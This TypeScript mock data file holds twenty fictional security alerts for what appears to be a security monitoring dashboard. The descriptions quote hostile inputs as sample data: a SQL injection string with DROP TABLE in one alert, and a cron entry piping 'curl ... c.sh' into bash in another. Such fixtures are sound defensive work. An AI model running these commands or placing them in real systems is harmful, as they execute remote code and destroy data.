import type { Alert } from '../../types';

// ─── Helper ───────────────────────────────────────────────────────────────────

function minsAgo(minutes: number): string {
  return new Date(Date.now() - minutes * 60 * 1000).toISOString();
}
function hoursAgo(hours: number): string {
  return minsAgo(hours * 60);
}

// ─── Extended Mock Alert Dataset (20 alerts) ──────────────────────────────────

export const ALERTS_MOCK_DATA: Alert[] = [
  // ── Critical ────────────────────────────────────────────────────────────────
  {
    id: 'ALT-001',
    title: 'Brute-Force Login Attempt Detected',
    description:
      'Multiple failed SSH login attempts (47 in 90s) from external IP 203.0.113.42. Account lockout policy triggered. Host is a production web server; attacker may be probing credentials before escalation.',
    severity: 'critical',
    status: 'open',
    source: 'ids',
    timestamp: minsAgo(4),
    affectedHost: '192.168.1.10',
  },
  {
    id: 'ALT-002',
    title: 'Privilege Escalation via Sudo Misconfiguration',
    description:
      'User "www-data" gained interactive root shell via a misconfigured /etc/sudoers entry (NOPASSWD: ALL). Incident was captured by auditd. Root session lasted 4 minutes before Wazuh triggered the alert.',
    severity: 'critical',
    status: 'open',
    source: 'siem',
    timestamp: minsAgo(17),
    affectedHost: 'web-srv-01',
  },
  {
    id: 'ALT-003',
    title: 'Ransomware Behavior: Mass File Encryption',
    description:
      'Process "svchost32.exe" (non-system) is rapidly modifying and renaming files with .locked extension. Over 2,400 files affected in 3 minutes. C: drive heavily impacted.',
    severity: 'critical',
    status: 'open',
    source: 'siem',
    timestamp: minsAgo(35),
    affectedHost: 'wkstn-09',
  },
  {
    id: 'ALT-004',
    title: 'Lateral Movement via Pass-the-Hash',
    description:
      'NTLM hash of "domain\\admin" observed authenticating to 6 internal hosts within 90 seconds using Mimikatz-like technique. Originating from compromised endpoint wkstn-14.',
    severity: 'critical',
    status: 'acknowledged',
    source: 'siem',
    timestamp: minsAgo(58),
    affectedHost: 'wkstn-14',
  },
  // ── High ────────────────────────────────────────────────────────────────────
  {
    id: 'ALT-005',
    title: 'Port Scan Detected on DMZ Subnet',
    description:
      'Nmap SYN scan (-sS) observed targeting all 65535 ports across 192.168.50.0/24 from internal host 192.168.1.88. Scan completed in ~8 minutes with 14 open ports discovered.',
    severity: 'high',
    status: 'acknowledged',
    source: 'blue_team',
    timestamp: minsAgo(42),
    affectedHost: '192.168.50.0/24',
  },
  {
    id: 'ALT-006',
    title: 'Outbound C2 Beacon Traffic',
    description:
      'Host wkstn-14 is making periodic HTTP GET requests every 60 seconds to domain c2panel.darkweb-test.io (known C2 IOC). Total data exfiltrated: ~14MB over 2 hours.',
    severity: 'high',
    status: 'open',
    source: 'siem',
    timestamp: hoursAgo(1),
    affectedHost: 'wkstn-14',
  },
  {
    id: 'ALT-007',
    title: 'SQL Injection Attempt on Login Endpoint',
    description:
      "Malicious payload in POST /api/auth/login body: ' OR 1=1; DROP TABLE users;--. Attack was blocked by WAF rule 942100 but repeated 12 times from same IP. IP: 203.0.113.99.",
    severity: 'high',
    status: 'resolved',
    source: 'ids',
    timestamp: hoursAgo(2),
    affectedHost: 'api-gw-01',
  },
  {
    id: 'ALT-008',
    title: 'Suspicious PowerShell Execution',
    description:
      'PowerShell launched with -EncodedCommand flag and -WindowStyle Hidden. Decoded payload attempted to download a remote script from 198.51.100.5:8080/stage2.ps1. Blocked by AppLocker.',
    severity: 'high',
    status: 'open',
    source: 'siem',
    timestamp: hoursAgo(3),
    affectedHost: 'wkstn-03',
  },
  {
    id: 'ALT-009',
    title: 'Unauthorized RDP Access from External IP',
    description:
      'Successful RDP authentication from external IP 198.51.100.77 (geolocation: Eastern Europe) outside business hours (02:14 AM). Account: helpdesk-temp (inactive account).',
    severity: 'high',
    status: 'acknowledged',
    source: 'blue_team',
    timestamp: hoursAgo(5),
    affectedHost: 'jump-srv-01',
  },
  {
    id: 'ALT-010',
    title: 'Web Shell Uploaded to Application Server',
    description:
      'File "shell.php" uploaded via unauthenticated file upload endpoint /api/upload. File contains b374k web shell code. Execution was attempted once before detection.',
    severity: 'high',
    status: 'resolved',
    source: 'ids',
    timestamp: hoursAgo(6),
    affectedHost: 'web-srv-02',
  },
  // ── Medium ──────────────────────────────────────────────────────────────────
  {
    id: 'ALT-011',
    title: 'Unusual Outbound Data Transfer',
    description:
      'Host db-srv-02 transferred 4.2 GB to external IP 203.0.113.55 between 01:00–03:00 AM, outside normal operational hours. Protocol: SFTP (port 22). No authorized transfer job scheduled.',
    severity: 'medium',
    status: 'acknowledged',
    source: 'blue_team',
    timestamp: hoursAgo(8),
    affectedHost: 'db-srv-02',
  },
  {
    id: 'ALT-012',
    title: 'Expired TLS Certificate on API Gateway',
    description:
      'TLS certificate for api.internal.lab (SAN: *.internal.lab) expired 3 days ago. Clients are receiving SSL errors. HSTS policy preventing fallback. Renewal request pending with PKI team.',
    severity: 'medium',
    status: 'open',
    source: 'blue_team',
    timestamp: hoursAgo(10),
    affectedHost: 'api-gw-01',
  },
  {
    id: 'ALT-013',
    title: 'Repeated DNS Queries to Suspicious Domain',
    description:
      'Host wkstn-22 is querying domain "updates-microsoft-patch.ru" 120+ times per hour. Domain registered 8 days ago with Whois privacy. Consistent with DGA or beaconing behavior.',
    severity: 'medium',
    status: 'open',
    source: 'ids',
    timestamp: hoursAgo(12),
    affectedHost: 'wkstn-22',
  },
  {
    id: 'ALT-014',
    title: 'Service Account Password Age Exceeds Policy',
    description:
      'Service account "svc-backup" last password change: 187 days ago. Policy maximum: 90 days. Account has broad file server read/write access. Flagged by compliance checker.',
    severity: 'medium',
    status: 'open',
    source: 'siem',
    timestamp: hoursAgo(14),
    affectedHost: 'dc-01',
  },
  {
    id: 'ALT-015',
    title: 'ARP Spoofing Detected on LAN Segment',
    description:
      'Host 192.168.1.200 is broadcasting ARP replies claiming ownership of the default gateway MAC (192.168.1.1). 8 hosts on the subnet may be routing traffic through the rogue host.',
    severity: 'medium',
    status: 'acknowledged',
    source: 'ids',
    timestamp: hoursAgo(18),
    affectedHost: '192.168.1.200',
  },
  // ── Low ─────────────────────────────────────────────────────────────────────
  {
    id: 'ALT-016',
    title: 'Failed Wazuh Agent Heartbeat',
    description:
      'Wazuh agent on db-srv-03 has not reported in 15 minutes. Agent process may have crashed or the host may be unreachable. Auto-restart script initiated; pending confirmation.',
    severity: 'low',
    status: 'acknowledged',
    source: 'blue_team',
    timestamp: hoursAgo(22),
    affectedHost: 'db-srv-03',
  },
  {
    id: 'ALT-017',
    title: 'Cron Job Added by Non-Admin User',
    description:
      'User "deploy" on wkstn-07 added crontab entry: "*/5 * * * * curl http://192.168.1.200/c.sh | bash". The command downloads and executes a remote script. Entry was not in change management.',
    severity: 'low',
    status: 'open',
    source: 'siem',
    timestamp: hoursAgo(26),
    affectedHost: 'wkstn-07',
  },
  {
    id: 'ALT-018',
    title: 'USB Mass Storage Device Connected',
    description:
      'USB storage device (SanDisk Cruzer 32GB, UUID: 7A3F) connected to wkstn-11 at 10:32 PM outside business hours. DLP policy violation — removable media restricted on this workstation.',
    severity: 'low',
    status: 'resolved',
    source: 'siem',
    timestamp: hoursAgo(30),
    affectedHost: 'wkstn-11',
  },
  // ── Info ─────────────────────────────────────────────────────────────────────
  {
    id: 'ALT-019',
    title: 'ICMP Flood Detected',
    description:
      'Spike in ICMP echo requests originating from 192.168.1.50 at 500 pps. Pattern is consistent with a lab ping stress test. No response from external hosts. Likely internal tooling.',
    severity: 'info',
    status: 'dismissed',
    source: 'ids',
    timestamp: hoursAgo(36),
    affectedHost: '192.168.1.50',
  },
  {
    id: 'ALT-020',
    title: 'Successful Login from New Geolocation',
    description:
      'User "j.morales" successfully authenticated from IP 185.220.101.44 (Tor exit node, Berlin, DE). Previous logins always from 192.168.1.x. MFA was passed. Account activity normal post-login.',
    severity: 'info',
    status: 'acknowledged',
    source: 'siem',
    timestamp: hoursAgo(40),
    affectedHost: 'auth-srv-01',
  },
];
